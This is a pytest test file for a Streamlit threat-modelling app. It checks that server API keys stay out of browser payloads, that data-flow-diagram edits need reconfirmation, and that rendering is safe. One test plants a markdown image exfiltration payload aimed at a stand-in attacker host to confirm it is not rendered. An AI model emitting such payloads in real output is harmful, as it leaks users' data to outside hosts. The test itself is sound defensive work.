"""Exercise the real Streamlit application with fake credentials and providers."""

from __future__ import annotations

import io
from pathlib import Path
from unittest.mock import Mock

import pytest
import streamlit as st
from streamlit.testing.v1 import AppTest

from stride_gpt.models import PROVIDERS

APP = Path(__file__).resolve().parents[1] / "apps" / "web" / "main.py"
DFD = "flowchart TD\n Browser-->API"


@pytest.fixture
def web_app(monkeypatch):
    """No local dotenv or live provider traffic is allowed in UI regressions."""
    monkeypatch.setenv("LITELLM_LOCAL_MODEL_COST_MAP", "True")
    monkeypatch.delenv("GITHUB_API_KEY", raising=False)
    monkeypatch.setattr("dotenv.load_dotenv", lambda *_args, **_kwargs: False)

    def no_live_calls(*_args, **_kwargs):
        pytest.fail("UI test attempted a live provider call")

    monkeypatch.setattr("litellm.completion", no_live_calls)
    monkeypatch.setattr("openai.OpenAI", no_live_calls)
    monkeypatch.setattr("github.Github", no_live_calls)
    return AppTest.from_file(str(APP), default_timeout=20)


def _run(app):
    app.run()
    assert not app.exception
    return app


def _describe(app):
    app.session_state["app_input"] = "A browser calls an API backed by a database."
    app.session_state["_sync_app_desc"] = True
    return _run(app)


def _generate(app):
    next(button for button in app.button if button.label == "Generate DFD").click()
    return _run(app)


@pytest.mark.parametrize(
    "provider",
    [
        info.provider_key for info in PROVIDERS.values()
        if info.env_var and info.provider_key != "OpenRouter API"
    ],
)
def test_server_credentials_never_enter_browser_payloads(web_app, monkeypatch, provider):
    secrets = []
    for info in PROVIDERS.values():
        if info.env_var:
            marker = f"fake-server-secret-{info.env_var}"
            secrets.append(marker)
            monkeypatch.setenv(info.env_var, marker)
    secrets.append("fake-server-secret-GITHUB_API_KEY")
    monkeypatch.setenv("GITHUB_API_KEY", secrets[-1])

    app = _run(web_app)
    app.selectbox(key="model_provider").select(provider)
    _run(app)

    # Protobuf fields are the actual UI messages serialized to the browser;
    # checking only password-field appearance would miss the original leak.
    payloads = b"".join(
        node.proto.SerializeToString()
        for node in app
        if getattr(node, "proto", None) is not None
    )
    for marker in secrets:
        assert marker.encode() not in payloads
        assert marker not in repr(app.session_state.to_dict())
    assert all(not field.value for field in app.text_input if "API key" in field.label)


def test_server_key_is_usable_and_user_override_can_be_cleared(web_app, monkeypatch):
    import dfd

    monkeypatch.setenv("OPENAI_API_KEY", "fake-server-openai-key")
    provider = Mock(return_value=DFD)
    monkeypatch.setattr(dfd, "get_dfd_openai", provider)
    app = _describe(_run(web_app))

    _generate(app)
    assert provider.call_args.args[0] == "fake-server-openai-key"
    assert app.text_input(key="credential_openai_api_key").value == ""

    app.text_input(key="credential_openai_api_key").input("fake-user-override")
    _run(app)
    _generate(app)
    assert provider.call_args.args[0] == "fake-user-override"

    app.text_input(key="credential_openai_api_key").input("")
    _run(app)
    _generate(app)
    assert provider.call_args.args[0] == "fake-server-openai-key"


def test_generated_dfd_survives_reruns_and_replacement_requires_confirmation(web_app, monkeypatch):
    import dfd

    monkeypatch.setenv("OPENAI_API_KEY", "fake-server-openai-key")
    provider = Mock(return_value=DFD)
    monkeypatch.setattr(dfd, "get_dfd_openai", provider)
    app = _describe(_run(web_app))

    _generate(app)
    assert provider.call_count == 1
    assert app.text_area(key="dfd_editor").value == DFD
    assert app.session_state["dfd_mermaid"] == DFD
    assert not app.checkbox(key="dfd_confirm_checkbox").value
    _run(app)
    assert app.text_area(key="dfd_editor").value == DFD

    edited = "flowchart TD\n Browser-->Gateway-->API"
    app.text_area(key="dfd_editor").input(edited)
    _run(app)
    app.checkbox(key="dfd_confirm_checkbox").check()
    _run(app)
    assert app.session_state["confirmed_dfd"] == edited
    assert app.session_state["dfd_mermaid"] == edited

    replacement = "flowchart TD\n Client-->Queue"
    provider.return_value = replacement
    _generate(app)
    assert app.text_area(key="dfd_editor").value == replacement
    assert app.session_state["dfd_mermaid"] == replacement
    assert not app.checkbox(key="dfd_confirm_checkbox").value
    assert "confirmed_dfd" not in app.session_state


@pytest.mark.parametrize("edited", ["", "  \n", "flowchart TD\n Browser-->Gateway"])
def test_editing_confirmed_dfd_requires_fresh_confirmation(web_app, monkeypatch, edited):
    import dfd

    monkeypatch.setenv("OPENAI_API_KEY", "fake-server-openai-key")
    monkeypatch.setattr(dfd, "get_dfd_openai", Mock(return_value=DFD))
    app = _generate(_describe(_run(web_app)))
    app.checkbox(key="dfd_confirm_checkbox").check()
    _run(app)
    assert app.session_state["confirmed_dfd"] == DFD

    app.text_area(key="dfd_editor").input(edited)
    _run(app)
    assert app.session_state["dfd_mermaid"] == edited
    assert "confirmed_dfd" not in app.session_state
    if edited.strip():
        assert not app.checkbox(key="dfd_confirm_checkbox").value
    _run(app)
    assert "confirmed_dfd" not in app.session_state


def test_edit_invalidates_dfd_before_threat_model_generation(web_app, monkeypatch):
    import dfd
    import threat_model

    monkeypatch.setenv("OPENAI_API_KEY", "fake-server-openai-key")
    monkeypatch.setattr(dfd, "get_dfd_openai", Mock(return_value=DFD))
    provider = Mock(return_value={"threat_model": [], "improvement_suggestions": []})
    monkeypatch.setattr(threat_model, "get_threat_model", provider)
    app = _generate(_describe(_run(web_app)))
    app.checkbox(key="dfd_confirm_checkbox").check()
    _run(app)

    # The Threat Model tab executes before the DFD tab in the app script.
    # A callback must remove stale approval before the next generation starts.
    app.text_area(key="dfd_editor").input("")
    next(button for button in app.button if button.label == "Generate Threat Model").click()
    _run(app)
    assert provider.call_count == 1
    assert DFD not in provider.call_args.args[2]
    assert "confirmed_dfd" not in app.session_state


def test_uploaded_dfd_updates_editor_and_detects_same_name_size_replacement(web_app, monkeypatch):
    import dfd

    monkeypatch.setenv("GOOGLE_API_KEY", "fake-server-google-key")
    parser = Mock(side_effect=[DFD, "flowchart TD\n Client-->Database"])
    monkeypatch.setattr(dfd, "get_dfd_from_image_google", parser)
    app = _run(web_app)
    app.selectbox(key="model_provider").select("Google AI API")
    _run(app)
    original_uploader = st.file_uploader
    current_upload = io.BytesIO(b"first-image-bytes")
    current_upload.name = "diagram.png"
    current_upload.type = "image/png"

    def upload(label, *args, **kwargs):
        if kwargs.get("key") == "dfd_image_uploader":
            return current_upload
        return original_uploader(label, *args, **kwargs)

    # AppTest does not implement file-uploader input yet; substitute only its
    # UploadedFile return value, keeping the application parsing flow real.
    monkeypatch.setattr(st, "file_uploader", upload)
    _run(app)
    assert app.text_area(key="dfd_editor").value == DFD
    assert parser.call_count == 1
    _run(app)
    assert parser.call_count == 1
    app.checkbox(key="dfd_confirm_checkbox").check()
    _run(app)
    assert app.session_state["confirmed_dfd"] == DFD

    current_upload = io.BytesIO(b"other-image-bytes")
    current_upload.name = "diagram.png"
    current_upload.type = "image/png"
    _run(app)
    assert parser.call_count == 2
    assert app.text_area(key="dfd_editor").value == "flowchart TD\n Client-->Database"
    assert not app.checkbox(key="dfd_confirm_checkbox").value
    assert "confirmed_dfd" not in app.session_state


def test_model_markdown_cannot_render_remote_images_or_links(web_app):
    app = _run(web_app)
    app.session_state["threat_model_markdown"] = (
        "## Threats\n\n![leak](https://attacker.invalid/image?data=FAKE_SOURCE)\n"
        "[click](https://attacker.invalid/link)"
    )
    _run(app)
    rendered = "\n".join(node.value for node in app.markdown)
    assert "attacker.invalid" not in rendered
    assert "## Threats" in rendered
